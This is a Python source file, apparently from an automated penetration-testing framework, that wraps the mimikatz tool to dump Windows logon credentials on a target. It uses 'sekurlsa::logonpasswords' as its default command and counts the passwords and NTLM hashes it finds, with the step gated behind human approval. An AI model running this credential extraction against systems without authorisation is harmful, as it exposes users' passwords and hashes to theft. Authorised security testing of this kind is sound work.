"""mimikatz wrapper — credential extraction on the Windows target (post phase).

Credential dumping is maximally destructive/high-signal — always gated and, by
default, requires human approval in semi-autonomous mode. The wrapper invokes
the operator-staged binary with a command sequence and normalises the extracted
credential count; it embeds no payload of its own.
"""

from __future__ import annotations

import re
from typing import Any

from tools.base import Tool, ToolResult
from tools.runner import run_subprocess

_CRED_RE = re.compile(r"(?:Password|NTLM)\s*:\s*(?P<val>\S+)")


class MimikatzTool(Tool):
    name = "mimikatz"
    binary = "mimikatz"
    phases = ("post",)
    requires_interception = True

    async def run(
        self, target: str = "", commands: str = "sekurlsa::logonpasswords",
        timeout: int = 120, **_: Any,
    ) -> ToolResult:
        cmd = ["mimikatz", commands, "exit"]
        r = await run_subprocess(cmd, timeout=timeout)
        if not r.found:
            return ToolResult(success=False, skipped=True, stderr=r.stderr)
        return ToolResult(success=r.returncode == 0, stdout=r.stdout, stderr=r.stderr,
                          parsed=self.parse(r.stdout), duration_ms=r.duration_ms)

    def parse(self, stdout: str) -> dict[str, Any]:
        creds = [m.group("val") for m in _CRED_RE.finditer(stdout)
                 if m.group("val") not in ("(null)", "")]
        return {"credentials_found": len(creds)}
